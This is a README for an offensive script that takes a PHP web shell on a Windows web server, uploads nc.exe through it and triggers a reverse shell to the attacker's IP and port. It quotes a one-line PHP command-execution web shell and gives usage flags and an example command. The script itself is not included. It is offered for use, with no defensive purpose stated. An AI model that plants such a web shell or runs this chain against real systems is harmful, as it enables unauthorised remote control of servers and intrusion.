# Windows_web_RCE_to_reverse_shell
The script will automate the upload of nc.exe to the windows machine and trigger it to get a reverse shell. 


If you manage to upload a php file containing somethings like that "<?php system($_GET["cmd"]);?>" you can then use this script to upload automaticly nc.exe on the target and send a reverse shell on your machine

!! Do not forget to check those value !!
Path of nc.exe on your machine 
Parameter name you use on the php file 


Parameter 

-h : to display the help function 
-u : url of the php file 
-i : ip for the reverse shell
-p : port for the reverse shell


Exemple Usage 

./script.sh -u http://example/file.php -i 127.0.0.1 -p 1234
